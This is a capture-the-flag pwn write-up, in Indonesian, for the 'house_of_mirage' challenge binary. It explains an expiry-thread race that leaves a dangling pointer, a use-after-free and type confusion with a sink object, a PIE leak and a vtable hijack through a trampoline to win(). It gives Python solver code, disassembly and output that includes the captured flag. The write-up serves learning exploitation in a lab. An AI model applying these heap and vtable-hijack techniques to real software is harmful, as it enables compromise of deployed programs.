# House of Mirage — Pwn Writeup

## Informasi Challenge

| Field | Value |
|---|---|
| Category | Pwn |
| Architecture | amd64 |
| Binary | `house_of_mirage` |
| Vulnerability | Race condition, Use-After-Free, type confusion, vtable hijacking |
| Flag format | `grodno{}` |

## Ringkasan

Binary memakai custom object pool untuk dua tipe object: **session** dan **sink**. Sebuah thread terpisah berjalan setiap 25 ms untuk menghapus session yang kedaluwarsa.

Masalah utamanya ada pada proses penghapusan session. Object dikembalikan ke pool dan isinya ditimpa pola `0xA5`, tetapi pointer pada tabel `sessions[]` tidak dikosongkan. Pointer tersebut menjadi dangling pointer.

Chunk session yang sudah bebas kemudian dapat digunakan kembali sebagai sink. Karena pointer session lama dan pointer sink baru menunjuk chunk yang sama, operasi session dapat membaca dan menulis object sink. Primitive ini dipakai untuk:

1. Membocorkan vtable sink dan menghitung PIE base.
2. Menimpa vtable sink melalui fitur mirror import.
3. Mengarahkan virtual call saat sink di-flush menuju fungsi `win()`.

Flag yang didapat:

```text
grodno{3002330c-04ce-45ca-a5b9-857927af64a6}
```

---

## Recon

Isi attachment:

```bash
ls -la
```

```text
house_of_mirage
ld-linux-x86-64.so.2
libc.so.6
libgcc_s.so.1
libm.so.6
libstdc++.so.6
```

Identifikasi binary:

```bash
file house_of_mirage
```

```text
house_of_mirage: ELF 64-bit LSB pie executable, x86-64,
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
for GNU/Linux 4.4.0, stripped
```

Proteksi:

```bash
pwn checksec house_of_mirage
```

```text
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
```

Tidak ada jalur stack overflow yang menarik. Full RELRO juga menutup overwrite GOT sederhana. Fokus analisis berpindah ke lifecycle object dan thread expiry.

Program menyediakan menu berikut:

```text
1. create session
2. show session
3. mirror import session profile
4. session scratchpad
5. arm session expiry
6. create sink
7. configure sink memo
8. flush sink
9. telemetry
0. quit
```

---

## Struktur Object

Session dan sink memakai allocator serta ukuran object yang sama. Payload object berukuran `0x60` byte, dengan metadata pool sebesar `0x10` byte tepat sebelum payload.

Layout yang relevan:

| Offset | Session | Sink |
|---:|---|---|
| `+0x00` | serial | pointer vtable |
| `+0x08` | expiry timestamp | creation timestamp |
| `+0x10` | owner | label |
| `+0x28` | tagline | data internal |
| `+0x38` | scratch pointer | memo pointer |
| `+0x40` | scratch length | memo length |
| `+0x48` | metadata | sink serial |
| `+0x50` | guard | guard |

Layout kedua tipe object cukup mirip sehingga chunk session dapat digunakan kembali sebagai sink tanpa menyebabkan crash langsung. Kondisi ini menghasilkan type confusion yang stabil.

---

## Custom Pool

Free-list custom disimpan pada global pointer. Ketika allocator mengambil chunk lama, pointer yang dikembalikan adalah alamat chunk ditambah `0x10`, karena bagian awal dipakai sebagai metadata.

Pada pembuatan sink, potongan assembly pentingnya:

```asm
mov    r8, qword ptr [free_list]
mov    rdx, qword ptr [r8]
lea    r15, [r8+0x10]
mov    qword ptr [free_list], rdx

lea    rax, [rip+...]        ; PIE + 0x6030
mov    qword ptr [r15], rax  ; sink->vtable

call   time
mov    qword ptr [r15+0x8], rax
```

Sink baru memiliki:

```text
sink->vtable    = PIE + 0x6030
sink->timestamp = time(NULL)
```

Nilai vtable ini nantinya menjadi PIE leak.

---

## Bug pada Expiry Thread

Binary membuat thread background yang memindai delapan slot `sessions[]`. Thread tersebut tidur selama 25 ms pada setiap iterasi:

```asm
; timespec:
; tv_sec  = 0
; tv_nsec = 25000000

call nanosleep
```

Pengecekan expiry:

```asm
mov    rax, qword ptr [object+0x8]
sub    rax, 1
cmp    rax, now
jae    not_expired
```

Secara sederhana:

```c
if (object->expiry - 1 < time(NULL)) {
    free_object(object);
}
```

Saat session kedaluwarsa, thread melakukan beberapa hal:

```asm
mov qword ptr [object+0x00], 0xdead4eadbeef1337
mov qword ptr [object+0x38], 0
mov qword ptr [object+0x40], 0
mov qword ptr [object+0x50], 0
```

Setelah itu seluruh payload object ditimpa pola `0xA5` dan chunk dimasukkan ke free-list.

Potongan pentingnya:

```asm
movd   xmm2, dword ptr [PIE+0x4004] ; 0xa5a5a5a5
pshufd xmm0, xmm2, 0

movups [object+0x00], xmm0
movups [object+0x10], xmm0
movups [object+0x20], xmm0
movups [object+0x30], xmm0
movups [object+0x40], xmm0
movups [object+0x50], xmm0
```

Bug-nya: **slot pada `sessions[]` tidak pernah diubah menjadi `NULL`**.

Alurnya menjadi:

```text
sessions[id] ────────┐
                     ▼
                 freed chunk
                     │
                     ▼
                custom pool
```

Pointer pada `sessions[id]` tetap dapat dipakai oleh menu `show session`, `mirror import`, dan `arm expiry`.

---

## Reuse sebagai Sink

Setelah session dibebaskan, pembuatan sink mengambil chunk pertama dari free-list:

```text
sessions[id] ────────┐
                     ▼
                 reused chunk
                     ▲
                     │
sinks[sink_id] ──────┘
```

Sekarang satu object dapat diakses melalui dua tipe:

- Sebagai session melalui dangling pointer `sessions[id]`.
- Sebagai sink melalui `sinks[sink_id]`.

Ini memberi dua primitive:

1. `show session` membaca field `+0x00`, yang sekarang berisi vtable sink.
2. `mirror import` menulis data session ke object yang sebenarnya merupakan sink.

---

## Race Kedua: Sink Langsung Dianggap Expired

Ada detail yang membuat exploit awal tidak stabil.

Sink diinisialisasi dengan:

```c
sink->timestamp = time(NULL);
```

Namun thread expiry masih memindai chunk tersebut melalui dangling pointer pada `sessions[id]`. Dengan kondisi:

```c
object->timestamp - 1 < time(NULL)
```

sink yang baru dibuat langsung dianggap expired pada tick berikutnya. Window yang tersedia hanya sekitar 25 ms.

Mengirim command secara biasa tidak cukup stabil:

```python
sendline("6")
sendlineafter("label: ", label)
sendline("5")
```

Setiap `sendlineafter()` menunggu output dari server dan menambah network round-trip. Pada remote, sink sering sudah dibebaskan sebelum expiry-nya sempat dipindahkan ke masa depan.

---

## Arti Leak `0xa5a5a5a5a5a5a5a5`

Eksploitasi awal menghasilkan:

```text
[+] vtable leak : 0xa5a5a5a5a5a5a5a5
```

Nilai tersebut bukan address leak. Itu adalah poison pattern allocator.

Artinya:

1. Session sudah dibebaskan.
2. Sink sempat memakai chunk yang sama.
3. Thread expiry membebaskan sink lagi sebelum `show session`.
4. Field vtable telah ditimpa `0xA5`.

Mengurangi atau menambah delay secara acak tidak menyelesaikan akar masalah. Input untuk membuat sink dan memperpanjang expiry harus diproses tanpa menunggu balasan server.

---

## Menstabilkan Race

Solusinya adalah mengirim beberapa pasangan command dalam **satu TCP send**:

```text
6
r0
5
<session_id>
3600
6
r1
5
<session_id>
3600
...
```

Setiap pasangan melakukan:

1. Membuat sink.
2. Langsung memanggil `arm session expiry` melalui dangling session.
3. Mengubah field `+0x08` pada chunk overlap menjadi waktu jauh di masa depan.

Tidak ada network round-trip di antara kedua operasi tersebut.

Delapan pasangan dikirim sekaligus. Jika sink pertama keburu dibebaskan, sink selanjutnya cenderung memakai kembali chunk yang sama. Slot sink sebelumnya juga tidak dikosongkan, sehingga beberapa sink ID dapat menjadi alias ke chunk yang sama.

Potongan solver:

```python
def spray_sink_race(io, session_id, count=8, seconds=3600):
    batch = bytearray()

    for i in range(count):
        batch += b"6\n"
        batch += f"r{i}\n".encode()
        batch += b"5\n"
        batch += f"{session_id}\n".encode()
        batch += f"{seconds}\n".encode()

    io.send(bytes(batch))
```

Setelah batch selesai, `show session` digunakan untuk membaca field pertama dari object.

Leak harus divalidasi:

```python
if vtable == 0xA5A5A5A5A5A5A5A5:
    raise RuntimeError("race miss")

if (vtable & 0xFFF) != 0x030:
    raise RuntimeError("bukan sink vtable")
```

---

## PIE Leak

Vtable sink berada pada offset tetap:

```text
sink vtable = PIE + 0x6030
```

Karena `show session` mencetak field `serial` pada offset `+0x00`, session dangling akan mencetak pointer vtable sink:

```text
serial: 0x7f...6030
```

PIE base dihitung dengan:

```python
pie_base = vtable_leak - 0x6030
```

Validasi tambahan:

```python
if pie_base & 0xFFF:
    raise RuntimeError("PIE base tidak page-aligned")
```

Setelah PIE base diketahui:

```python
win = pie_base + 0x3970
```

---

## Fungsi `win()`

Fungsi pada offset `0x3970` mencetak pesan archive replay dan flag yang telah dibaca dari `flag.txt` saat program mulai.

Potongan awal fungsi:

```asm
0000000000003970:
    push   rbx
    lea    rdi, [mutex]
    call   pthread_mutex_lock

    lea    rsi, [archive_replay_message]
    lea    rdi, [std::cout]
    call   ostream_insert

    lea    rdi, [flag_buffer]
    call   strlen
    ...
    call   exit
```

Target akhir exploit adalah mengarahkan virtual call sink ke `PIE+0x3970`.

---

## Vtable Hijacking Tanpa Heap Leak

Menu `flush sink` melakukan virtual call:

```asm
mov    rdi, qword ptr [sinks + id*8]
mov    rax, qword ptr [rdi]
call   qword ptr [rax]
```

Secara sederhana:

```c
sink->vtable[0](sink, message);
```

Pendekatan awal membuat fake vtable di heap:

```text
sink+0x00 = sink_address + 8
sink+0x08 = win
```

Cara ini memerlukan heap leak melalui telemetry. Exploit final tidak membutuhkannya.

Di section `.data.rel.ro`, offset `PIE+0x5c60` sudah berisi pointer:

```bash
objdump -s --start-address=0x5c40 --stop-address=0x5c80 house_of_mirage
```

```text
Contents of section .data.rel.ro:
 5c40 00000000 00000000 685c0000 00000000
 5c50 203a0000 00000000 303a0000 00000000
 5c60 103a0000 00000000 00000000 00000000
```

Nilainya:

```text
[PIE + 0x5c60] = PIE + 0x3a10
```

Kode pada `PIE+0x3a10`:

```asm
0000000000003a10:
    jmp qword ptr [rdi+0x8]
```

Saat virtual call dilakukan, register `rdi` sudah berisi pointer sink. Maka payload cukup:

```text
sink+0x00 = PIE + 0x5c60
sink+0x08 = PIE + 0x3970
```

Alur control flow:

```text
flush sink
    │
    ├─ rdi = sink
    │
    ├─ rax = [sink+0x00]
    │       = PIE+0x5c60
    │
    ├─ call [rax]
    │       = PIE+0x3a10
    │
    └─ jmp [rdi+0x08]
            = PIE+0x3970
            = win()
```

Payload final hanya 16 byte:

```python
payload = p64(pie_base + 0x5C60)
payload += p64(pie_base + 0x3970)
```

Payload tersebut ditulis melalui `mirror import` menggunakan dangling session pointer.

---

## Urutan Exploit

Alur lengkapnya:

```text
create session
      │
      ▼
arm expiry = 0
      │
      ▼
expiry thread membebaskan object
tetapi sessions[id] tidak dikosongkan
      │
      ▼
create sink memakai reused chunk
      │
      ▼
arm expiry melalui dangling session
agar sink tidak dibebaskan lagi
      │
      ▼
show session
leak sink->vtable = PIE+0x6030
      │
      ▼
hitung PIE base dan win()
      │
      ▼
mirror import melalui dangling session
sink+0x00 = PIE+0x5c60
sink+0x08 = win
      │
      ▼
flush sink
      │
      ▼
virtual call → trampoline → win()
```

Implementasi inti:

```python
session_id = create_session(io)
arm_expiry(io, session_id, 0)

time.sleep(0.10)

sink_ids = spray_sink_race(io, session_id)

stale = show_session(io, session_id)
vtable = parse_serial(stale)

pie_base = vtable - 0x6030
fake_vtable = pie_base + 0x5C60
win = pie_base + 0x3970

mirror_import(
    io,
    session_id,
    p64(fake_vtable) + p64(win),
)

flush_sink(io, sink_ids[0])
```

---

## Menjalankan Solver

Lokal:

```bash
python3 solve.py
```

Remote:

```bash
python3 solve.py 10.112.0.12 40849
```

Solver melakukan retry otomatis karena exploit masih melibatkan scheduling thread.

Contoh output lokal:

```text
[*] attempt 1/1
[+] vtable leak : 0x7eca0b8ed030
[+] PIE base    : 0x7eca0b8e7000
[+] fake vtable : 0x7eca0b8ecc60
[+] win         : 0x7eca0b8ea970
[+] sink aliases: [0, 1, 2, 3, 4, 5, 6, 7]

[mirage] archive replay unlocked
grodno{test_flag_replace_me_on_remote}
```

Hasil remote:

```text
[mirage] archive replay unlocked
grodno{3002330c-04ce-45ca-a5b9-857927af64a6}
```
